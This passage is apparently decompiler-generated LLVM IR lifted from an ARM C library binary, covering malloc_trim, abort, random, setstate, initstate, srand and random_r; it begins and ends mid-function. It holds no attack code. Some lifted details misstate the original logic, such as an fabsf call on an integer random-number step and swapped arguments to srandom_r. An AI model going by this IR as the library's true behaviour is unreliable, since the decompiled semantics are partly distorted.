  br label %bb16

bb16:                                             ; preds = %dec_label_pc_c1cc, %bb
  %v1_c1e0 = xor i1 %v2_c1d8, true
  call void @__pseudo_cond_branch(i1 %v1_c1e0, i32 ptrtoint (i32* @global_var_be84.147 to i32))
  %v0_c1e4 = load i32, i32* @r4, align 4
  %v1_c1e4 = add i32 %v0_c1e4, 44
  %v2_c1e4 = inttoptr i32 %v1_c1e4 to i32*
  %v3_c1e4 = load i32, i32* %v2_c1e4, align 4
  store i32 %v3_c1e4, i32* %r3.global-to-local, align 4
  %v1_c1e8 = add i32 %v3_c1e4, 4
  %v2_c1e8 = inttoptr i32 %v1_c1e8 to i32*
  %v3_c1e8 = load i32, i32* %v2_c1e8, align 4
  store i32 %v3_c1e8, i32* %r3.global-to-local, align 4
  %v1_c1ec = add i32 %v0_c1e4, 836
  %v2_c1ec = inttoptr i32 %v1_c1ec to i32*
  %v3_c1ec = load i32, i32* %v2_c1ec, align 4
  store i32 %v3_c1ec, i32* @r2, align 4
  %v1_c1f0 = and i32 %v3_c1e8, -4
  store i32 %v1_c1f0, i32* %r3.global-to-local, align 4
  %v3_c1f4 = icmp ult i32 %v1_c1f0, %v3_c1ec
  br i1 %v3_c1f4, label %dec_label_pc_c234, label %dec_label_pc_c1fc

dec_label_pc_c1fc:                                ; preds = %bb16
  store i32 %v0_c1e4, i32* %r1.global-to-local, align 4
  %v1_c200 = add i32 %v0_c1e4, 840
  %v2_c200 = inttoptr i32 %v1_c200 to i32*
  %v3_c200 = load i32, i32* %v2_c200, align 4
  store i32 %v3_c200, i32* %r0.global-to-local, align 4
  %v2_c204 = call i32 @__malloc_trim(i32 %v3_c200, i32 %v0_c1e4)
  store i32 %v2_c204, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c234

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c0d0
  %v2_c20c = inttoptr i32 %v1_c0a0 to i32*
  %v3_c20c = load i32, i32* %v2_c20c, align 4
  store i32 %v3_c20c, i32* %r0.global-to-local, align 4
  %v1_c210 = add i32 %v4_c090, 848
  %v2_c210 = inttoptr i32 %v1_c210 to i32*
  %v3_c210 = load i32, i32* %v2_c210, align 4
  store i32 %v3_c210, i32* %r2.global-to-local, align 4
  %v1_c214 = add i32 %v4_c090, 868
  %v2_c214 = inttoptr i32 %v1_c214 to i32*
  %v3_c214 = load i32, i32* %v2_c214, align 4
  %v2_c218 = add i32 %v3_c20c, %v1_c09c
  store i32 %v2_c218, i32* %r1.global-to-local, align 4
  %v1_c21c = add i32 %v3_c210, -1
  store i32 %v1_c21c, i32* %r2.global-to-local, align 4
  %v2_c220 = sub i32 %v3_c214, %v2_c218
  store i32 %v2_c220, i32* %r3.global-to-local, align 4
  store i32 %v2_c220, i32* %v2_c214, align 4
  %v1_c228 = load i32, i32* @lr, align 4
  %v2_c228 = add i32 %v1_c228, 848
  %v3_c228 = inttoptr i32 %v2_c228 to i32*
  store i32 %v1_c21c, i32* %v3_c228, align 4
  %v0_c22c = load i32, i32* %r0.global-to-local, align 4
  %v1_c22c = load i32, i32* @r5, align 4
  %v2_c22c = sub i32 %v1_c22c, %v0_c22c
  store i32 %v2_c22c, i32* %r0.global-to-local, align 4
  %v4_c230 = call i32 @munmap(i32 %v2_c22c, i32 %v2_c218, i32 %v1_c21c, i32 %v2_c220)
  store i32 %v4_c230, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c234

dec_label_pc_c234:                                ; preds = %bb16, %dec_label_pc_c1c4, %dec_label_pc_c1fc, %dec_label_pc_c0b0, %dec_label_pc_c20c
  store i32 %v2_c044, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  %v0_c240 = load i32, i32* @r7, align 4
  %v2_c240 = add i32 %v0_c240, 48
  %v3_c240 = inttoptr i32 %v2_c240 to i32*
  %v4_c240 = load i32, i32* %v3_c240, align 4
  store i32 %v4_c240, i32* @ip, align 4
  store i32 49740, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_c240)
  br label %dec_label_pc_c24c

dec_label_pc_c24c:                                ; preds = %entry, %dec_label_pc_c234
  store i32 %v3_c038, i32* @r4, align 4
  store i32 %v6_c038, i32* @r5, align 4
  store i32 %v9_c038, i32* @r6, align 4
  store i32 %v12_c038, i32* @r7, align 4
  store i32 %v18_c038, i32* @lr, align 4
  ret i32 %v2_c044

; uselistorder directives
  uselistorder i32 %v0_c1e4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_c1a4, { 1, 0 }
  uselistorder i32 %v1_c0e4, { 1, 0 }
  uselistorder i32 %v0_c0e4, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 1, 0 }
  uselistorder i32 %v1_c09c, { 1, 0, 2 }
  uselistorder i32 %v2_c098, { 1, 2, 0, 3 }
  uselistorder i32 %v4_c090, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c040, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_c24c, { 1, 0 }
  uselistorder label %dec_label_pc_c234, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_c1c4, { 1, 0 }
  uselistorder label %dec_label_pc_c184, { 1, 0 }
  uselistorder label %dec_label_pc_c178, { 1, 0 }
  uselistorder label %dec_label_pc_c174, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c128, { 1, 0 }
}

define i32 @function_c25c(i32 %arg1) local_unnamed_addr {
dec_label_pc_c25c:
  %v0_c25c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c25c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c25c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c25c, %bb
  %v10_c270 = phi i32 [ %arg1, %dec_label_pc_c25c ], [ 0, %bb ]
  ret i32 %v10_c270

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_c274 = load i32, i32* @r4, align 4
  store i32 %v3_c274, i32* %stack_var_-12, align 4
  %v6_c274 = load i32, i32* @r5, align 4
  %v4_c284 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_c284, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_c284, i32* @r0, align 4
  %v0_c294 = call i32 @__malloc_consolidate()
  %v0_c298 = load i32, i32* @r4, align 4
  %v0_c29c = load i32, i32* @r5, align 4
  %v2_c2a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c2a4, i32* @r4, align 4
  store i32 %v6_c274, i32* @r5, align 4
  %v2_c2a8 = call i32 @__malloc_trim(i32 %v0_c298, i32 %v0_c29c)
  %v0_c2ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c2ac, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_c2b0 = phi i32 [ %v2_c2a8, %entry ], [ 0, %bb ]
  ret i32 %v4_c2b0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  %v4_c2cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 16) to i32*), align 4
  store i32 49880, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_c2cc)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_c2f4 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_c2fc = load i32, i32* @r5, align 4
  %v2_c2fc = add i32 %v0_c2fc, 1248
  %v3_c2fc = inttoptr i32 %v2_c2fc to i32*
  %v4_c2fc = load i32, i32* %v3_c2fc, align 4
  %v2_c300 = icmp eq i32 %v4_c2fc, 0
  br i1 %v2_c300, label %dec_label_pc_c308, label %dec_label_pc_c348

dec_label_pc_c308:                                ; preds = %entry
  store i32 1, i32* %v3_c2fc, align 4
  br label %dec_label_pc_c310

dec_label_pc_c310:                                ; preds = %dec_label_pc_c358, %dec_label_pc_c308
  %v0_c314 = load i32, i32* @r5, align 4
  %v2_c314 = add i32 %v0_c314, 232
  store i32 %v2_c314, i32* @r4, align 4
  %v2_c320 = add i32 %v0_c314, 72
  %v3_c320 = inttoptr i32 %v2_c320 to i32*
  %v4_c320 = load i32, i32* %v3_c320, align 4
  call void @__pseudo_branch(i32 %v4_c320)
  %v1_c330 = call i32 @__GI_raise(i32 6)
  %v0_c33c = load i32, i32* @r5, align 4
  %v2_c33c = add i32 %v0_c33c, 16
  %v3_c33c = inttoptr i32 %v2_c33c to i32*
  %v4_c33c = load i32, i32* %v3_c33c, align 4
  store i32 49992, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_c33c)
  %v0_c34c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c348

dec_label_pc_c348:                                ; preds = %entry, %dec_label_pc_c310
  %v1_c360 = phi i32 [ %v0_c2fc, %entry ], [ %v0_c34c.pre, %dec_label_pc_c310 ]
  %v2_c34c = add i32 %v1_c360, 1248
  %v3_c34c = inttoptr i32 %v2_c34c to i32*
  %v4_c34c = load i32, i32* %v3_c34c, align 4
  %v7_c350 = icmp eq i32 %v4_c34c, 1
  br i1 %v7_c350, label %dec_label_pc_c358, label %dec_label_pc_c394

dec_label_pc_c358:                                ; preds = %dec_label_pc_c348
  %v2_c358 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_c358, i32* @r4, align 4
  store i32 2, i32* %v3_c34c, align 4
  %v3_c370 = bitcast i32* %stack_var_-28 to i8*
  %v4_c370 = call i32 @__GI_memset(i8* %v3_c370, i32 0, i32 20)
  %v3_c38c = call i32 @__libc_sigaction(i32 6, i32 %v2_c358, i32 0)
  br label %dec_label_pc_c310

dec_label_pc_c394:                                ; preds = %dec_label_pc_c348
  %v7_c394 = icmp eq i32 %v4_c34c, 2
  br i1 %v7_c394, label %dec_label_pc_c39c, label %dec_label_pc_c3a8

dec_label_pc_c39c:                                ; preds = %dec_label_pc_c394
  store i32 3, i32* %v3_c34c, align 4
  %v0_c3a4 = call i32 @abort()
  %v0_c3a8.pre = load i32, i32* @r5, align 4
  %v1_c3a8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_c3a8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c394, %dec_label_pc_c39c
  %v3_c3b4 = phi i32 [ 1248, %dec_label_pc_c394 ], [ %v1_c3a8.pre, %dec_label_pc_c39c ]
  %v2_c3b4 = phi i32 [ %v1_c360, %dec_label_pc_c394 ], [ %v0_c3a8.pre, %dec_label_pc_c39c ]
  %v2_c3a8 = add i32 %v2_c3b4, %v3_c3b4
  %v3_c3a8 = inttoptr i32 %v2_c3a8 to i32*
  %v4_c3a8 = load i32, i32* %v3_c3a8, align 4
  %v7_c3ac = icmp eq i32 %v4_c3a8, 3
  br i1 %v7_c3ac, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_c3a8
  store i32 4, i32* %v3_c3a8, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_c3a8, %bb
  call void @__pseudo_cond_branch(i1 %v7_c3ac, i32 ptrtoint (i32* @global_var_a92c.157 to i32))
  br label %dec_label_pc_c3c0

dec_label_pc_c3c0:                                ; preds = %dec_label_pc_c3c0, %.thread2
  %v0_c3c0 = call i32 @abort()
  br label %dec_label_pc_c3c0

; uselistorder directives
  uselistorder i32* %v3_c34c, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_c3a8, { 1, 0 }
  uselistorder label %dec_label_pc_c348, { 1, 0 }
}

define i32 @function_c3cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_c3cc:
  %v0_c3cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c3cc, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_c3cc
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_c3cc, %bb
  %v4_c3d8 = phi i32 [ %arg1, %dec_label_pc_c3cc ], [ 0, %bb ]
  ret i32 %v4_c3d8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  %v4_c40c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c40c)
  %v0_c420 = load i32, i32* @r4, align 4
  %v2_c420 = add i32 %v0_c420, 16
  %v3_c420 = inttoptr i32 %v2_c420 to i32*
  %v4_c420 = load i32, i32* %v3_c420, align 4
  call void @__pseudo_branch(i32 %v4_c420)
  %v2_c430 = ptrtoint i32* %stack_var_-20 to i32
  %v0_c434 = load i32, i32* @r4, align 4
  %v2_c434 = add i32 %v0_c434, 408
  %v2_c438 = inttoptr i32 %v2_c434 to i32*
  %v3_c438 = call i32 @__GI_random_r(i32* %v2_c438, i32 %v2_c430)
  %v0_c448 = load i32, i32* @r4, align 4
  %v2_c448 = add i32 %v0_c448, 48
  %v3_c448 = inttoptr i32 %v2_c448 to i32*
  %v4_c448 = load i32, i32* %v3_c448, align 4
  call void @__pseudo_branch(i32 %v4_c448)
  %v3_c454 = load i32, i32* %stack_var_-20, align 4
  ret i32 %v3_c454
}

define i32 @function_c468(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c468:
  %v0_c468 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c468, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c468
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c468, %bb
  %v10_c47c = phi i32 [ %arg1, %dec_label_pc_c468 ], [ 0, %bb ]
  ret i32 %v10_c47c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_c4b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c4b0)
  %v0_c4c4 = load i32, i32* @r6, align 4
  %v2_c4c4 = add i32 %v0_c4c4, 16
  %v3_c4c4 = inttoptr i32 %v2_c4c4 to i32*
  %v4_c4c4 = load i32, i32* %v3_c4c4, align 4
  call void @__pseudo_branch(i32 %v4_c4c4)
  %v0_c4d4 = load i32, i32* @r6, align 4
  %v2_c4d4 = add i32 %v0_c4d4, 408
  %v0_c4dc = load i32, i32* @r5, align 4
  %v1_c4e0 = add i32 %v0_c4d4, 416
  %v2_c4e0 = inttoptr i32 %v1_c4e0 to i32*
  %v3_c4e0 = load i32, i32* %v2_c4e0, align 4
  store i32 %v3_c4e0, i32* @r4, align 4
  %v2_c4e4 = inttoptr i32 %v2_c4d4 to i32*
  %v3_c4e4 = call i32 @setstate_r(i32 %v0_c4dc, i32* %v2_c4e4)
  %v1_c4ec = icmp slt i32 %v3_c4e4, 0
  %v3_c4fc = load i32, i32* @r4, align 4
  %v4_c4fc = add i32 %v3_c4fc, -4
  %storemerge = select i1 %v1_c4ec, i32 0, i32 %v4_c4fc
  %v0_c500 = load i32, i32* @r6, align 4
  %v2_c500 = add i32 %v0_c500, 48
  %v3_c500 = inttoptr i32 %v2_c500 to i32*
  %v4_c500 = load i32, i32* %v3_c500, align 4
  call void @__pseudo_branch(i32 %v4_c500)
  ret i32 %storemerge
}

define i32 @function_c520(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c520:
  %v0_c520 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c520, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c520
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c520, %bb
  %v10_c534 = phi i32 [ %arg1, %dec_label_pc_c520 ], [ 0, %bb ]
  ret i32 %v10_c534

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_c570 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c570)
  %v0_c584 = load i32, i32* @r4, align 4
  %v2_c584 = add i32 %v0_c584, 16
  %v3_c584 = inttoptr i32 %v2_c584 to i32*
  %v4_c584 = load i32, i32* %v3_c584, align 4
  call void @__pseudo_branch(i32 %v4_c584)
  %v0_c594 = load i32, i32* @r6, align 4
  %v0_c598 = load i32, i32* @r4, align 4
  %v2_c598 = add i32 %v0_c598, 408
  %v0_c59c = load i32, i32* @r7, align 4
  %v0_c5a0 = load i32, i32* @sl, align 4
  store i32 %v0_c5a0, i32* @r0, align 4
  %v1_c5a4 = add i32 %v0_c598, 416
  %v2_c5a4 = inttoptr i32 %v1_c5a4 to i32*
  %v3_c5a4 = load i32, i32* %v2_c5a4, align 4
  store i32 %v3_c5a4, i32* @r5, align 4
  %v4_c5a8 = inttoptr i32 %v0_c5a0 to i32*
  %v5_c5a8 = call i32 @__GI_initstate_r(i32* %v4_c5a8, i32 %v0_c594, i32 %v0_c59c, i32 %v2_c598)
  %v0_c5b8 = load i32, i32* @r4, align 4
  %v2_c5b8 = add i32 %v0_c5b8, 48
  %v3_c5b8 = inttoptr i32 %v2_c5b8 to i32*
  %v4_c5b8 = load i32, i32* %v3_c5b8, align 4
  call void @__pseudo_branch(i32 %v4_c5b8)
  %v0_c5c4 = load i32, i32* @r5, align 4
  %v1_c5c4 = add i32 %v0_c5c4, -4
  ret i32 %v1_c5c4
}

define i32 @function_c5e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c5e0:
  %v0_c5e0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c5e0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c5e0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c5e0, %bb
  %v10_c5f4 = phi i32 [ %arg1, %dec_label_pc_c5e0 ], [ 0, %bb ]
  ret i32 %v10_c5f4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_c5f8 = load i32, i32* @r4, align 4
  %v6_c5f8 = load i32, i32* @r5, align 4
  %v9_c5f8 = load i32, i32* @r6, align 4
  %v15_c5f8 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r4, align 4
  %v2_c60c = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 256), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_c628 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c628)
  %v0_c63c = load i32, i32* @r4, align 4
  %v2_c63c = add i32 %v0_c63c, 16
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  %v4_c63c = load i32, i32* %v3_c63c, align 4
  call void @__pseudo_branch(i32 %v4_c63c)
  %v0_c64c = load i32, i32* @r6, align 4
  store i32 %v0_c64c, i32* @r0, align 4
  %v0_c650 = load i32, i32* @r4, align 4
  %v2_c650 = add i32 %v0_c650, 408
  %v2_c654 = inttoptr i32 %v0_c64c to i32*
  %v3_c654 = call i32 @srandom_r(i32* %v2_c654, i32 %v2_c650)
  %v0_c668 = load i32, i32* @r4, align 4
  %v2_c668 = add i32 %v0_c668, 48
  %v3_c668 = inttoptr i32 %v2_c668 to i32*
  %v4_c668 = load i32, i32* %v3_c668, align 4
  call void @__pseudo_branch(i32 %v4_c668)
  store i32 %v3_c5f8, i32* @r4, align 4
  store i32 %v6_c5f8, i32* @r5, align 4
  store i32 %v9_c5f8, i32* @r6, align 4
  store i32 %v15_c5f8, i32* @lr, align 4
  ret i32 %v2_c60c
}

define i32 @function_c684(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c684:
  %v0_c684 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c684, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c684
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c684, %bb
  %v10_c698 = phi i32 [ %arg1, %dec_label_pc_c684 ], [ 0, %bb ]
  ret i32 %v10_c698

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c69c = load i32, i32* @r4, align 4
  store i32 %v3_c69c, i32* %stack_var_-8, align 4
  %v1_c6a0 = add i32 %tmp, 12
  %v2_c6a0 = inttoptr i32 %v1_c6a0 to i8*
  %v3_c6a0 = load i8, i8* %v2_c6a0, align 1
  %v4_c6a0 = sext i8 %v3_c6a0 to i32
  store i32 %v4_c6a0, i32* %r3.global-to-local, align 4
  %v2_c6a4 = icmp eq i8 %v3_c6a0, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_c6b0 = add i32 %tmp, 8
  %v2_c6b0 = inttoptr i32 %v1_c6b0 to i32*
  %v3_c6b0 = load i32, i32* %v2_c6b0, align 4
  store i32 %v3_c6b0, i32* %lr.global-to-local, align 4
  br i1 %v2_c6a4, label %dec_label_pc_c6b8, label %dec_label_pc_c6dc

dec_label_pc_c6b8:                                ; preds = %entry
  %v1_c6b8 = inttoptr i32 %v3_c6b0 to i32*
  %v2_c6b8 = load i32, i32* %v1_c6b8, align 4
  store i32 %v2_c6b8, i32* %r2.global-to-local, align 4
  %v2_c6c0 = mul i32 %v2_c6b8, 1103515245
  %v1_c6c8 = add i32 %v2_c6c0, 12345
  %tmp6 = bitcast i32 %v1_c6c8 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_c6cc = bitcast float %tmp7 to i32
  store i32 %v1_c6cc, i32* %r3.global-to-local, align 4
  store i32 %v1_c6cc, i32* %v1_c6b8, align 4
  %v0_c6d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_c6d4 = inttoptr i32 %arg2 to i32*
  store i32 %v0_c6d4, i32* %v2_c6d4, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c6dc:                                ; preds = %entry
  %v2_c6dc = load i32, i32* %arg1, align 4
  store i32 %v2_c6dc, i32* %r2.global-to-local, align 4
  %v1_c6e0 = add i32 %tmp, 4
  %v2_c6e0 = inttoptr i32 %v1_c6e0 to i32*
  %v3_c6e0 = load i32, i32* %v2_c6e0, align 4
  store i32 %v3_c6e0, i32* %r0.global-to-local, align 4
  %v1_c6e4 = inttoptr i32 %v2_c6dc to i32*
  %v2_c6e4 = load i32, i32* %v1_c6e4, align 4
  store i32 %v2_c6e4, i32* %r1.global-to-local, align 4
  %v1_c6e8 = inttoptr i32 %v3_c6e0 to i32*
  %v2_c6e8 = load i32, i32* %v1_c6e8, align 4
  %v4_c6e8 = add i32 %v3_c6e0, 4
  store i32 %v4_c6e8, i32* %r0.global-to-local, align 4
  %v2_c6ec = add i32 %v2_c6e8, %v2_c6e4
  store i32 %v2_c6ec, i32* %r3.global-to-local, align 4
  store i32 %v2_c6ec, i32* %v1_c6e4, align 4
  %v3_c6f0 = load i32, i32* %r2.global-to-local, align 4
  %v4_c6f0 = add i32 %v3_c6f0, 4
  store i32 %v4_c6f0, i32* %r2.global-to-local, align 4
  %v0_c6f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_c6f4 = add i32 %v0_c6f4, 16
  %v2_c6f4 = inttoptr i32 %v1_c6f4 to i32*
  %v3_c6f4 = load i32, i32* %v2_c6f4, align 4
  store i32 %v3_c6f4, i32* %r1.global-to-local, align 4
  %v0_c6f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_c6f8 = udiv i32 %v0_c6f8, 2
  store i32 %v3_c6f8, i32* %r3.global-to-local, align 4
  %v3_c6fc = icmp ult i32 %v4_c6f0, %v3_c6f4
  %v1_c700 = load i32, i32* %r4.global-to-local, align 4
  %v2_c700 = inttoptr i32 %v1_c700 to i32*
  store i32 %v3_c6f8, i32* %v2_c700, align 4
  br i1 %v3_c6fc, label %dec_label_pc_c70c, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_c6dc
  %v1_c704 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_c704, i32* %r2.global-to-local, align 4
  %v0_c714.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_c70c:                                ; preds = %dec_label_pc_c6dc
  %v0_c70c = load i32, i32* %r0.global-to-local, align 4
  %v1_c70c = load i32, i32* %r1.global-to-local, align 4
  %v3_c70c = icmp ult i32 %v0_c70c, %v1_c70c
  br i1 %v3_c70c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_c70c
  %v1_c710 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_c710, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_c70c, %._crit_edge, %bb
  %v0_c714 = phi i32 [ %v0_c714.pre, %._crit_edge ], [ %v0_c70c, %dec_label_pc_c70c ], [ %v1_c710, %bb ]
  %v1_c714 = load i32, i32* %ip.global-to-local, align 4
  %v2_c714 = add i32 %v1_c714, 4
  %v3_c714 = inttoptr i32 %v2_c714 to i32*
  store i32 %v0_c714, i32* %v3_c714, align 4
  %v0_c718 = load i32, i32* %r2.global-to-local, align 4
  %v1_c718 = load i32, i32* %ip.global-to-local, align 4
  %v2_c718 = inttoptr i32 %v1_c718 to i32*
  store i32 %v0_c718, i32* %v2_c718, align 4
  br label %dec_label_pc_c71c

dec_label_pc_c71c:                                ; preds = %dec_label_pc_c6b8, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c720 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c720, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_c6f8, { 1, 0 }
  uselistorder i32 %v1_c6cc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_c71c, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_c72c = load i32, i32* @r4, align 4
  store i32 %v3_c72c, i32* %stack_var_-36, align 4
  %v1_c730 = add i32 %tmp, 12
  %v2_c730 = inttoptr i32 %v1_c730 to i8*
  %v3_c730 = load i8, i8* %v2_c730, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_c740 = load i8, i8* %v2_c730, align 1
  %tmp33 = icmp ugt i8 %v3_c730, 4
  br i1 %tmp33, label %.dec_label_pc_c7ec_crit_edge, label %dec_label_pc_c74c

.dec_label_pc_c7ec_crit_edge:                     ; preds = %entry
  br label %dec_label_pc_c7ec

dec_label_pc_c74c:                                ; preds = %entry
  %v0_c74c = load i32, i32* @r0, align 4
